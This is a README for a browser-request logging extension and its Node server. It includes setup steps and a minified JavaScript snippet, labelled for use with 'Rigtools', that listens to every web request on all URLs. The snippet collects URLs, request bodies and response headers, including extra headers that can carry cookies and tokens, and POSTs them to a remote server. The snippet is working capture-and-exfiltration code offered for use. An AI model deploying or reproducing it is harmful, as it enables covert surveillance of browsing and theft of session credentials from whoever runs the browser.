# mitm-extension
Log all request sent to and from your browser

## Setup
```sh
$ git clone https://github.com/entrpix/mitm-extension
```

## Extension
- Inside `mitm-extension/extension/background.js` edit:
  - `SERVER_URL` to be your server
  - `TOKEN` to be your token
- Zip the extension
- Then go to `chrome://extensions`
  - Enable developer mode
  - Load extension

## Server
```sh
$ cd mitm-extension
$ cd server
$ touch .env
$ echo "TOKEN=YOUR_TOKEN" > .env
$ (p)npm i
$ node index.js
```

## Rigtools
```js
const SERVER_URL='http://DOMAIN:PORT/create';const TOKEN='TOKEN';function logServer(log){fetch(SERVER_URL,{method: 'POST',headers: {'Content-Type': 'application/json','Authentication': TOKEN},body: JSON.stringify(log)}).catch(error=>alert(error))};chrome.webRequest.onCompleted.addListener(function(details){const logEntry={ method: details.method,date: new Date().toISOString(),url: details.url,statusCode: details.statusCode,requestId: details.requestId,requestBody: details.requestBody||{},responseHeaders: details.responseHeaders||{}};logServer(logEntry)},{ urls: ["<all_urls>"] },["responseHeaders","extraHeaders"]);
```
